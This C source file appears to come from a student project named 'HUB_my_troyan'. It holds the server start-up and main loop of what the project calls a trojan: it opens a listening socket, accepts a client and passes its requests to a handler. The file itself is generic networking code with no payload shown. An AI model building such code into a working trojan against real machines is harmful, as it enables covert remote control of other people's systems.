/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 18/04/2021 app_start.c
*/

#include "troyan_server.h"

bool loop = true;

void app_stop(void)
{
    loop = false;
}

static int app_loop(server_t *server)
{
    socket_t *client;
    int status = EXIT_SUCCESS;

    while (loop) {
        client = (server->client_connected) ? &server->client : NULL;
        if (socket_server_select(
                &server->select, client, &server->sock, STDIN_FILENO)) {
            status = EXIT_FAILURE;
            break;
        }
        if (server->select.status != 0) {
            if (app_process_request(server) == EXIT_FAILURE) {
                break;
            }
        }
    }
    return status;
}

static void app_destroy(server_t *server)
{
    if (server->client_connected) {
        socket_close(&server->client);
    }
    socket_close(&server->sock);
}

static int app_init(server_t *server, uint port)
{
    server->client_connected = false;
    server->client.fd = -1;
    if (socket_server_create(&server->sock, port, MAX_CLIENT))
        return EXIT_FAILURE;
    if (signal_init() == EXIT_FAILURE)
        return EXIT_FAILURE;
    return EXIT_SUCCESS;
}

int troyan_server_start(uint port)
{
    server_t server;

    if (app_init(&server, port) == EXIT_FAILURE)
        return EXIT_FAILURE;
    if (app_loop(&server) == EXIT_FAILURE) {
        app_destroy(&server);
        return EXIT_FAILURE;
    }
    app_destroy(&server);
    return EXIT_SUCCESS;
}